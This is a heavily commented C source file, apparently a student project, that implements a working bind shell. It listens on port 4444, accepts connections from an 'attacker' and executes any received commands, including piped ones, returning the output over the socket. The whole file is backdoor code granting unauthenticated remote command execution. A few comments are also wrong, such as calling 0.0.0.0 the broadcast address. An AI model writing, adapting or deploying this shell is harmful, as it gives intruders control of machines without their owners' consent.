// Contributions from Sharad and Bryan

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <arpa/inet.h>
#include <netinet/in.h>

#define BUFFER_LEN                                                             \
  4096 // Length in bytes of the messages which can be sent and received by the
       // socket
#define IP_ADDR "0.0.0.0" // Broadcast address
#define PORT                                                                   \
  4444 // Testing port to be used for communication between the client and
       // server

/*
  Name of Function: parse_command(char *cmd)
  Parameters in Function: char *cmd, represents the command which will be parsed
  Return of Function: char** args, the command parsed by spaces
  Purpose of Function: Takes a command and parses it by the spaces, then returns
  the parsed array
*/
char **parse_command(char *cmd) {
  int token_num = 0;  // Initializes the token_num integer
  char **args = NULL; // Initializes the double-pointer argument array
  char *token =
      strtok(cmd, " \n"); // Initializes the token character pointer to the
                          // instance before a space or new line in cmd, then
                          // replaces the first instance with a null terminator

  while (token != NULL) {
    args = realloc(
        args,
        (token_num + 1) *
            sizeof(char *)); // Since we're increasing the character pointer, we
                             // have to reallocate to account for it in args
    args[token_num++] = token; // Assigns the current value of args[token_num]
                               // to token, then increases token_num by 1
    token = strtok(
        NULL, " \n"); // Using the same string (cmd), we move the token pointer
                      // to the next instance of a new line or space, and
                      // replace the next instance with a null terminator
  }
  args =
      realloc(args, (token_num + 1) *
                        sizeof(char *)); // Reallocates to account for one more
                                         // char pointer, for the final instance
  args[token_num] = NULL;                // Null terminates the array

  return args; // If successful, it returns the parsed arguments
}

/*
  Name of Function: execute_methods(char *cmd, int in_fd, int attacker_socket)
  Parameters in Function: char *cmd, represents the command to be executed
                          int in_fd, the current input file descriptor
                          int attacker_socket, the file descriptor for the final
  output Return of Function: 0 if successful Purpose of Function: Takes a
  command and executes it
*/
int execute_methods(char *cmd, int in_fd, int attacker_socket) {
  char *next = strtok(NULL, "|"); // Using strtok, it gets the next command to
                                  // run after the current command, if any
  int out_fd = attacker_socket; // Sets out_fd (output file descriptor) equal to
                                // the file descriptor for the final output

  int fd[2] = {0,
               attacker_socket}; // Instantiates an array with file descriptors:
                                 // 0 (stdin) and attacker_socket

  if (next != NULL) {
    if (pipe(fd) < 0) {
      perror("Pipe failed."); // If piping result is less than zero, meaning it
                              // failed, it prints out "Pipe failed" to what was
                              // stderr (now client socket)
      exit(1); // Exits with exit code 1 (container shutdown either because of a
               // failure or invalid file)
    }
    out_fd = fd[1]; // Sets out_fd equal to the write side of the pipe
  }

  pid_t success = fork(); // Forks the parent process, creating a new child
                          // process with PID (process ID) success
  if (success < 0) {
    perror("Fork failed."); // If fork result is less than zero, meaning it
                            // failed, it prints out "Fork failed" to what was
                            // stderr (now client socket)
    exit(1); // Exits with exit code 1 (container shutdown either because of a
             // failure or invalid file)
  } else {
    if (success == 0) {
      dup2(in_fd, 0); // Sets the input to the in_fd, or the parameter passed in
      dup2(out_fd, 1); // Sets the output to the output file descriptor
      char **args =
          parse_command(cmd); // Parses the command, buffer, and stores the
                              // double character pointer in args
      if (execvp(args[0], args) < 0) {
        perror("Exec failed."); // If execvp result is less than zero, meaning
                                // it failed, it prints out "Exec failed" to
                                // what was stderr (now client socket)
        exit(1); // Exits with exit code 1 (container shutdown either because of
                 // a failure or invalid file)
      }
    } else {
      wait(NULL); // Waits for a state change in a child process then obtains
                  // information about the child
    }
  }

  if (next != NULL) {
    close(out_fd); // Closes the write file descriptor (you need it because if
                   // someone tries to read from the pipe, it will block)
    execute_methods(
        next, fd[0],
        attacker_socket); // Recursively calls execute_methods with the next
                          // part of the command and the read file descriptor
    close(fd[0]);         // Closes the read file descriptor
  }

  return 0; // If successful, the function returns 0
}

/*
  Name of Function: handle_attacker(int attacker_socket)
  Parameters in Function: int attacker_socket, representing the established
  socket which the attacker has accepted the listener's socket's connection
  Return of Function: 0 if successful
  Purpose of Function: Receive a message from the attacker socket, executes it
  on the listener, and print it out onto the attacker's command line
*/
int handle_attacker(int attacker_socket) {
  int fd[3] = {0, 1, 2}; // Instantiates an array with file descriptors: 0
                         // (stdin), 1 (stdout), and 2 (stderr)
  dup2(attacker_socket,
       fd[1]); // Redirects stdout output to the attacker socket
  dup2(attacker_socket,
       fd[2]); // Redirects stderr output to the attacker socket

  char buffer[BUFFER_LEN]; // Initializes a string of the buffer length called
                           // buffer
  memset(buffer, 0, BUFFER_LEN); // Sets all of the bytes of buffer to 0
  recv(attacker_socket, buffer, BUFFER_LEN,
       0); // Receives the message from the attacker_socket and stores it in
           // buffer

  while (strcmp(buffer, "quit\n") != 0) {
    execute_methods(strtok(buffer, "|"), attacker_socket,
                    attacker_socket); // Calls the execute_methods function

    memset(buffer, 0, BUFFER_LEN); // Sets all of the bytes of buffer to 0
    recv(attacker_socket, buffer, BUFFER_LEN,
         0); // Receives the message from the attacker_socket and stores it in
             // buffer
  }

  close(attacker_socket); // Closes the connection to the attacker socket before
                          // returning
  return 0;               // If successful, the function returns 0
}

/*
  Name of Function: handle_listener(void)
  Parameters in Function: void
  Return of Function: int, 0 if successful
  Purpose of Function: Initialize the listener and attacker sockets, and then
  proceed to handling the attacker
*/
int handle_listener(void) {
  int listener_socket = -1; // Initializes the listener socket integer
  int attacker_socket = -1; // Initializes the attacker socket integer

  struct sockaddr_in listener_addr; // Initializes a socket address
  listener_socket =
      socket(AF_INET, SOCK_STREAM,
             0); // Creates a listener socket which is an IPv4 running over TCP

  listener_addr.sin_family = AF_INET; // Sets the socket address family to IPv4
  listener_addr.sin_port =
      htons(PORT); // Sets the port number to communicate over to 4444
  listener_addr.sin_addr.s_addr =
      inet_addr(IP_ADDR); // Sets the IP address to communicate over to the
                          // broadcast address

  bind(listener_socket, (struct sockaddr *)&listener_addr,
       sizeof(listener_addr)); // Binds the listener socket to the information
                               // specified in the listener address
  listen(listener_socket,
         5); // Listens on the listener socket with up to 5 possible connections

  while (1) {
    attacker_socket = accept(listener_socket, NULL,
                             NULL);   // Creates a new socket with accepts a new
                                      // connection on the listener socket
    handle_attacker(attacker_socket); // Calls the handle_attacker method with
                                      // the attacker socket

    close(attacker_socket); // Closes the attacker socket so we don't run out of
                            // file descriptors
  }

  return 0; // If successful, the function returns 0
}

/*
  Name of Function: main(void)
  Parameters in Function: void
  Return of Function: int, 0 if successful
  Purpose of Function: Calls the handle_server() function
*/
int main(void) { handle_listener(); }
